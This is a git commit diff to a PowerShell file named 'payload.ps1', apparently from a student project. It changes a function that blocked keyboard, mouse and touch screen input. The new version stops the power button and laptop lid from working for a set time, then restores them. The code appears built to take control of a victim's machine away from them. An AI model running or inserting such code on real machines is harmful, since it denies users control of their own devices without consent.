3ba0d5fc9b3a1dbb0e049c4af69e1cadaa81d743
Edward Dsouza <z5689255@student.unsw.edu.au>
2026-07-19 23:26:47 +1000

    Added a few tests to disable the laptop screen

--- payload.ps1
+++ payload.ps1
@@ -9,15 +9,27 @@ $userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInp
 
 function Disable-UserInput($seconds) {
     try {
-        $userInput::BlockInput($true)
-        Get-PnpDevice | Where-Object {$_.Class -eq 'HIDClass' -and $_.InstanceId -like 'ACPI*'} | Disable-PnpDevice -Confirm:$false
-        Get-PnpDevice | Where-Object {$_.FriendlyName -like '*touch screen*'} | Disable-PnpDevice -Confirm:$false
+        # $userInput::BlockInput($true)
+        # Get-PnpDevice | Where-Object {$_.Class -eq 'HIDClass' -and $_.InstanceId -like 'ACPI*'} | Disable-PnpDevice -Confirm:$false
+        # Get-PnpDevice | Where-Object {$_.FriendlyName -like '*touch screen*'} | Disable-PnpDevice -Confirm:$false
+
+        powercfg /setacvalueindex scheme_current sub_buttons pbuttonaction 0
+        powercfg /setdcvalueindex scheme_current sub_buttons pbuttonaction 0
+        powercfg /setacvalueindex scheme_current sub_buttons lidaction 0
+        powercfg /setdcvalueindex scheme_current sub_buttons lidaction 0
+
         Start-Sleep $seconds
     }
     finally {
-        $userInput::BlockInput($false)
-        Get-PnpDevice | Where-Object {$_.Class -eq 'HIDClass' -and $_.InstanceId -like 'ACPI*'} | Enable-PnpDevice -Confirm:$false
-        Get-PnpDevice | Where-Object {$_.FriendlyName -like '*touch screen*'} | Enable-PnpDevice -Confirm:$false
+        # $userInput::BlockInput($false)
+        # Get-PnpDevice | Where-Object {$_.Class -eq 'HIDClass' -and $_.InstanceId -like 'ACPI*'} | Enable-PnpDevice -Confirm:$false
+        # Get-PnpDevice | Where-Object {$_.FriendlyName -like '*touch screen*'} | Enable-PnpDevice -Confirm:$false
+
+        powercfg /setacvalueindex scheme_current sub_buttons pbuttonaction 1
+        powercfg /setdcvalueindex scheme_current sub_buttons pbuttonaction 1
+        powercfg /setacvalueindex scheme_current sub_buttons lidaction 1
+        powercfg /setdcvalueindex scheme_current sub_buttons lidaction 1
+        
     }
 }
 
